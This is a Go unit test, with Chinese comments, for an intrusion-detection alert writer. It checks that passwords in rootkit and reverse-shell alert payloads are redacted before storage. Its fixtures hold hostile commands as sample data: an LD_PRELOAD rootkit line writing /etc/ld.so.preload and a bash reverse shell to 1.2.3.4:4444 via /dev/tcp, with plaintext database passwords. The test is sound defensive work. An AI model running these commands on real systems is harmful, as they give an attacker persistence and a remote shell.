package engine

import (
	"strings"
	"testing"
)

// 入侵检测类告警的详情带数字、数组、嵌套的 would_action：此前解不成扁平 map 就原样落库，
// rootkit 的 content、反弹 shell 的 cmdline 里的口令一个字不改。
func TestMarshalPayloadSanitizesStructuredPayloads(t *testing.T) {
	w := &StageAlertWriter{}
	for name, payload := range map[string]string{
		"rootkit": `{"categories":["ld_preload"],"content":"sh -c 'echo /tmp/x.so > /etc/ld.so.preload; mysql -uroot -pS3cret'",` +
			`"uid":0,"would_action":{"reason":"Rootkit/后门指标命中: ld_preload"}}`,
		"reverse_shell": `{"pid":4242,"cmdline":"bash -c 'mysql -uroot -pS3cret -e x; bash -i >& /dev/tcp/1.2.3.4/4444 0>&1'",` +
			`"would_action":{"reason":"反弹 shell","cmdline":"redis-cli -a S3cret ping"}}`,
	} {
		got := w.marshalPayload(Alert{Payload: []byte(payload)})
		if strings.Contains(got, "S3cret") {
			t.Errorf("%s 详情仍含口令: %s", name, got)
		}
		if !strings.Contains(got, "would_action") {
			t.Errorf("%s 详情结构被丢了: %s", name, got)
		}
	}
	if got := w.marshalPayload(Alert{Payload: []byte("not json")}); got != "not json" {
		t.Errorf("非 JSON 详情应原样保留: %q", got)
	}
}
